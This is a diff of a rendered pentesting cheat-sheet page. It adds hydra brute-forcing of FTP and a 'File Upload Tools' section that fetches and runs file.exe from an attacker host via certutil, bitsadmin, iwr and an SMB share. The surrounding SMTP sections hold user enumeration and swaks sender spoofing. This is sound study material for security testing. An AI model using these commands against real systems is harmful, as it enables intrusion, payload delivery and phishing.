@@ -1000,6 +1000,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#file-upload-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Upload Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2685,6 +2696,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#file-upload-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Upload Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -3381,6 +3403,7 @@
 </span></code></pre></div>
 <h4 id="rdp">RDP<a class="headerlink" href="#rdp" title="Permanent link">¶</a></h4>
 <div class="language-sh highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>xfreerdp3<span class="w"> </span>/u:USER/p:PASS<span class="w"> </span>/v:IP<span class="w"> </span>/dynamic-resolution
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>rdesktop<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>-p<span class="w"> </span>PASS
 </span></code></pre></div>
 <h3 id="reconnaissance-and-enumeration">Reconnaissance and Enumeration<a class="headerlink" href="#reconnaissance-and-enumeration" title="Permanent link">¶</a></h3>
 <div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Standard actions</span>
@@ -3487,11 +3510,13 @@
 </span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>USER<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-s<span class="w"> </span><span class="m">3389</span><span class="w"> </span>rdp://IP<span class="w"> </span>-t<span class="w"> </span><span class="m">1</span><span class="w"> </span>-v
 </span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="c1"># SSH</span>
 </span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>hydra<span class="w"> </span>-l<span class="w"> </span>USER<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>IP<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>ssh<span class="w"> </span>-V
-</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>
-</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="c1"># FFUF</span>
-</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="c1"># Use request saved with Burp (make sure to put in FUZZ)</span>
-</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="c1"># Contains autoalign, force HTTP, and proxy via Burp</span>
-</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-request<span class="w"> </span>flatpress_login<span class="w"> </span>-ac<span class="w"> </span>-x<span class="w"> </span>http://127.0.0.1:8080<span class="w"> </span>-request-proto<span class="w"> </span>http
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="c1"># FTP (also check empty, username, and reversed username password)</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>hydra<span class="w"> </span>-l<span class="w"> </span><span class="s1">'admin'</span><span class="w"> </span>-P<span class="w"> </span>SecLists/Passwords/Default-Credentials/default-passwords.txt<span class="w"> </span>ftp://192.168.105.46<span class="w"> </span>-e<span class="w"> </span>nsr<span class="w"> </span>-V
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="c1"># FFUF</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="c1"># Use request saved with Burp (make sure to put in FUZZ)</span>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="c1"># Contains autoalign, force HTTP, and proxy via Burp</span>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-request<span class="w"> </span>flatpress_login<span class="w"> </span>-ac<span class="w"> </span>-x<span class="w"> </span>http://127.0.0.1:8080<span class="w"> </span>-request-proto<span class="w"> </span>http
 </span></code></pre></div>
 <h6 id="johntheripper">JohnTheRipper<a class="headerlink" href="#johntheripper" title="Permanent link">¶</a></h6>
 <div class="language-sh highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># Crack SSH private key, run with ruleset</span>
@@ -3876,450 +3901,505 @@
 </span><span id="__span-24-25"><a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
 </span><span id="__span-24-26"><a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a><span class="p">}</span>
 </span></code></pre></div>
+<h5 id="file-upload-tools">File Upload Tools<a class="headerlink" href="#file-upload-tools" title="Permanent link">¶</a></h5>
+<p>Various ways to upload files to a Windows host.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Identify tools available</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>where<span class="w"> </span>curl
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>where<span class="w"> </span>wget
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>where<span class="w"> </span>certutil
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>where<span class="w"> </span>bitsadmin
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>where<span class="w"> </span>powershell
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>where<span class="w"> </span>python
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>where<span class="w"> </span>ftp
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="c1"># Writable directory candidates</span>
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>C:<span class="se">\T</span>emp
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>C:<span class="se">\P</span>rogramData
+</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>C:<span class="se">\U</span>sers<span class="se">\P</span>ublic
+</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>%APPDATA%
+</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="c1"># Check write access</span>
+</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a><span class="nb">echo</span><span class="w"> </span><span class="nb">test</span><span class="w"> </span>&gt;<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\t</span>est.txt
+</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>
+</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a><span class="c1"># HTTP</span>
+</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a><span class="c1"># Server</span>
+</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a><span class="c1"># Client (PowerShell)</span>
+</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>iwr<span class="w"> </span>http://IP/file.exe<span class="w"> </span>-OutFile<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\f</span>ile.exe
+</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>
+</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a><span class="c1"># certutil (cmd only, no PS)</span>
+</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>certutil<span class="w"> </span>-urlcache<span class="w"> </span>-split<span class="w"> </span>-f<span class="w"> </span>http://IP/file.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\f</span>ile.exe
+</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>
+</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a><span class="c1"># Curl (Win 10 1803+)</span>
+</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>curl<span class="w"> </span>http://IP/file.exe<span class="w"> </span>-o<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\f</span>ile.exe
+</span><span id="__span-25-30"><a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>
+</span><span id="__span-25-31"><a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a><span class="c1"># Bitsadmin</span>
+</span><span id="__span-25-32"><a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>bitsadmin<span class="w"> </span>/transfer<span class="w"> </span>job<span class="w"> </span>http://IP/file.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\f</span>ile.exe
+</span><span id="__span-25-33"><a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a>
+</span><span id="__span-25-34"><a id="__codelineno-25-34" name="__codelineno-25-34" href="#__codelineno-25-34"></a><span class="c1"># FTP</span>
+</span><span id="__span-25-35"><a id="__codelineno-25-35" name="__codelineno-25-35" href="#__codelineno-25-35"></a>ftp<span class="w"> </span>IP
+</span><span id="__span-25-36"><a id="__codelineno-25-36" name="__codelineno-25-36" href="#__codelineno-25-36"></a>put<span class="w"> </span>FILE
+</span><span id="__span-25-37"><a id="__codelineno-25-37" name="__codelineno-25-37" href="#__codelineno-25-37"></a>
+</span><span id="__span-25-38"><a id="__codelineno-25-38" name="__codelineno-25-38" href="#__codelineno-25-38"></a><span class="c1"># SMB</span>
+</span><span id="__span-25-39"><a id="__codelineno-25-39" name="__codelineno-25-39" href="#__codelineno-25-39"></a><span class="c1"># Server</span>
+</span><span id="__span-25-40"><a id="__codelineno-25-40" name="__codelineno-25-40" href="#__codelineno-25-40"></a>impacket-smbserver<span class="w"> </span>share<span class="w"> </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="w"> </span>-smb2support
+</span><span id="__span-25-41"><a id="__codelineno-25-41" name="__codelineno-25-41" href="#__codelineno-25-41"></a><span class="c1"># Client</span>
+</span><span id="__span-25-42"><a id="__codelineno-25-42" name="__codelineno-25-42" href="#__codelineno-25-42"></a>copy<span class="w"> </span><span class="se">\\</span>IP<span class="se">\s</span>hare<span class="se">\f</span>ile.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\f</span>ile.exe
+</span><span id="__span-25-43"><a id="__codelineno-25-43" name="__codelineno-25-43" href="#__codelineno-25-43"></a><span class="c1"># or map</span>
+</span><span id="__span-25-44"><a id="__codelineno-25-44" name="__codelineno-25-44" href="#__codelineno-25-44"></a>net<span class="w"> </span>use<span class="w"> </span>Z:<span class="w"> </span><span class="se">\\</span>IP<span class="se">\s</span>hare
+</span><span id="__span-25-45"><a id="__codelineno-25-45" name="__codelineno-25-45" href="#__codelineno-25-45"></a>Z:<span class="se">\f</span>ile.exe
+</span></code></pre></div>
 <h3 id="protocols">Protocols<a class="headerlink" href="#protocols" title="Permanent link">¶</a></h3>
 <p>Additional information per protocol.</p>
 <h4 id="ssh-tcp-22">SSH (TCP: 22)<a class="headerlink" href="#ssh-tcp-22" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Connect with specific SSH key only, without trying additional keys available on the system</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>ssh<span class="w"> </span>-o<span class="w"> </span><span class="s2">"UserKnownHostsFile=/dev/null"</span><span class="w"> </span>-o<span class="w"> </span><span class="s2">"StrictHostKeyChecking=no"</span><span class="w"> </span>-o<span class="w"> </span><span class="s1">'IdentitiesOnly=yes'</span><span class="w"> </span>-i<span class="w"> </span>/path/to/key<span class="w"> </span>USER@IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Connect with specific SSH key only, without trying additional keys available on the system</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>ssh<span class="w"> </span>-o<span class="w"> </span><span class="s2">"UserKnownHostsFile=/dev/null"</span><span class="w"> </span>-o<span class="w"> </span><span class="s2">"StrictHostKeyChecking=no"</span><span class="w"> </span>-o<span class="w"> </span><span class="s1">'IdentitiesOnly=yes'</span><span class="w"> </span>-i<span class="w"> </span>/path/to/key<span class="w"> </span>USER@IP
 </span></code></pre></div>
 <h4 id="smtp-tcp-25">SMTP (TCP: 25)<a class="headerlink" href="#smtp-tcp-25" title="Permanent link">¶</a></h4>
 <p><a href="https://hackviser.com/tactics/pentesting/services/smtp#connect">https://hackviser.com/tactics/pentesting/services/smtp#connect</a>&nbsp;</p>
 <h5 id="netcat_1">Netcat<a class="headerlink" href="#netcat_1" title="Permanent link">¶</a></h5>
 <p>Connect to SMTP server via netcat and verify users/email addresses:</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>nc<span class="w"> </span>-nv<span class="w"> </span>IP<span class="w"> </span><span class="m">25</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>VRFY<span class="w"> </span>root
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>VRFY<span class="w"> </span>idontexist
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>nc<span class="w"> </span>-nv<span class="w"> </span>IP<span class="w"> </span><span class="m">25</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>VRFY<span class="w"> </span>root
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>VRFY<span class="w"> </span>idontexist
 </span></code></pre></div>
 <h5 id="powershell_1">PowerShell<a class="headerlink" href="#powershell_1" title="Permanent link">¶</a></h5>
-<div class="language-ps1 highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">25</span> <span class="n">IP</span>
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="c"># Telnet (install)</span>
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="n">dism</span> <span class="p">/</span><span class="n">online</span> <span class="p">/</span><span class="nb">Enable-Feature</span> <span class="p">/</span><span class="n">FeatureName</span><span class="p">:</span><span class="n">TelnetClient</span>
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="n">telnet</span> <span class="n">IP</span> <span class="n">25</span>
+<div class="language-ps1 highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">25</span> <span class="n">IP</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="c"># Telnet (install)</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="n">dism</span> <span class="p">/</span><span class="n">online</span> <span class="p">/</span><span class="nb">Enable-Feature</span> <span class="p">/</span><span class="n">FeatureName</span><span class="p">:</span><span class="n">TelnetClient</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="n">telnet</span> <span class="n">IP</span> <span class="n">25</span>
 </span></code></pre></div>
 <h5 id="nmap_1">Nmap<a class="headerlink" href="#nmap_1" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">25</span>,587<span class="w"> </span>--script<span class="w"> </span>smtp-*<span class="w"> </span>target.com
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">25</span>,587<span class="w"> </span>--script<span class="w"> </span>smtp-*<span class="w"> </span>target.com
 </span></code></pre></div>
 <h5 id="smtp-user-enum">smtp-user-enum<a class="headerlink" href="#smtp-user-enum" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional</span>
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/metasploit/unix_users.txt<span class="w"> </span>-M<span class="w"> </span>VRFY<span class="w"> </span>-t<span class="w"> </span>IP
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/metasploit/unix_users.txt<span class="w"> </span>-M<span class="w"> </span>RCPT<span class="w"> </span>-t<span class="w"> </span>IP
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/metasploit/unix_users.txt<span class="w"> </span>-M<span class="w"> </span>EXPN<span class="w"> </span>-t<span class="w"> </span>IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1"># SMTP user enumeration via VRFY, EXPN and RCPT with clever timeout, retry and reconnect functional</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/metasploit/unix_users.txt<span class="w"> </span>-M<span class="w"> </span>VRFY<span class="w"> </span>-t<span class="w"> </span>IP
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/metasploit/unix_users.txt<span class="w"> </span>-M<span class="w"> </span>RCPT<span class="w"> </span>-t<span class="w"> </span>IP
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>smtp-user-enum<span class="w"> </span>-U<span class="w"> </span>/usr/share/wordlists/metasploit/unix_users.txt<span class="w"> </span>-M<span class="w"> </span>EXPN<span class="w"> </span>-t<span class="w"> </span>IP
 </span></code></pre></div>
 <h5 id="swaks">Swaks<a class="headerlink" href="#swaks" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1"># Basic SMTP connectivity test</span>
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="c1"># Specify SMTP port</span>
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--port<span class="w"> </span><span class="m">25</span>
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--port<span class="w"> </span><span class="m">587</span>
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--port<span class="w"> </span><span class="m">465</span><span class="w"> </span>--tls-on-connect
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="c1"># Enumerate users via RCPT TO</span>
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>swaks<span class="w"> </span>--to<span class="w"> </span>test@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--quit-after<span class="w"> </span>RCPT
-</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>
-</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a><span class="c1"># Manual MAIL FROM / RCPT TO control</span>
-</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>swaks<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--mail-from<span class="w"> </span>attacker@evil.com<span class="w"> </span>--to<span class="w"> </span>victim@target.com
-</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>
-</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a><span class="c1"># Test SMTP AUTH (LOGIN)</span>
-</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--auth<span class="w"> </span>LOGIN<span class="w"> </span>--auth-user<span class="w"> </span>user<span class="w"> </span>--auth-password<span class="w"> </span>pass
-</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a>
-</span><span id="__span-30-18"><a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a><span class="c1"># Test SMTP AUTH (PLAIN)</span>
-</span><span id="__span-30-19"><a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--auth<span class="w"> </span>PLAIN<span class="w"> </span>--auth-user<span class="w"> </span>user<span class="w"> </span>--auth-password<span class="w"> </span>pass
-</span><span id="__span-30-20"><a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a>
-</span><span id="__span-30-21"><a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a><span class="c1"># Spoof sender address</span>
-</span><span id="__span-30-22"><a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--from<span class="w"> </span>ceo@target.com<span class="w"> </span>--server<span class="w"> </span>target.com
-</span><span id="__span-30-23"><a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a>
-</span><span id="__span-30-24"><a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a><span class="c1"># Custom email body</span>
-</span><span id="__span-30-25"><a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--from<span class="w"> </span>attacker@evil.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--data<span class="w"> </span><span class="s2">"Subject: Test\n\nBody text"</span>
-</span><span id="__span-30-26"><a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a>
-</span><span id="__span-30-27"><a id="__codelineno-30-27" name="__codelineno-30-27" href="#__codelineno-30-27"></a><span class="c1"># Attach local file (also try with @ in front of filename)</span>
-</span><span id="__span-30-28"><a id="__codelineno-30-28" name="__codelineno-30-28" href="#__codelineno-30-28"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--attach<span class="w"> </span>file.txt
-</span><span id="__span-30-29"><a id="__codelineno-30-29" name="__codelineno-30-29" href="#__codelineno-30-29"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--attach<span class="w"> </span>@file.txt
-</span><span id="__span-30-30"><a id="__codelineno-30-30" name="__codelineno-30-30" href="#__codelineno-30-30"></a>
-</span><span id="__span-30-31"><a id="__codelineno-30-31" name="__codelineno-30-31" href="#__codelineno-30-31"></a><span class="c1"># Suppress data send (banner / capability recon)</span>
-</span><span id="__span-30-32"><a id="__codelineno-30-32" name="__codelineno-30-32" href="#__codelineno-30-32"></a>swaks<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--quit-after<span class="w"> </span>EHLO
-</span><span id="__span-30-33"><a id="__codelineno-30-33" name="__codelineno-30-33" href="#__codelineno-30-33"></a>
-</span><span id="__span-30-34"><a id="__codelineno-30-34" name="__codelineno-30-34" href="#__codelineno-30-34"></a><span class="c1"># Test open relay</span>
-</span><span id="__span-30-35"><a id="__codelineno-30-35" name="__codelineno-30-35" href="#__codelineno-30-35"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@external.com<span class="w"> </span>--from<span class="w"> </span>spoof@external.com<span class="w"> </span>--server<span class="w"> </span>target.com
-</span><span id="__span-30-36"><a id="__codelineno-30-36" name="__codelineno-30-36" href="#__codelineno-30-36"></a>
-</span><span id="__span-30-37"><a id="__codelineno-30-37" name="__codelineno-30-37" href="#__codelineno-30-37"></a><span class="c1"># Timeout control (avoid hanging)</span>
-</span><span id="__span-30-38"><a id="__codelineno-30-38" name="__codelineno-30-38" href="#__codelineno-30-38"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--timeout<span class="w"> </span><span class="m">5</span>
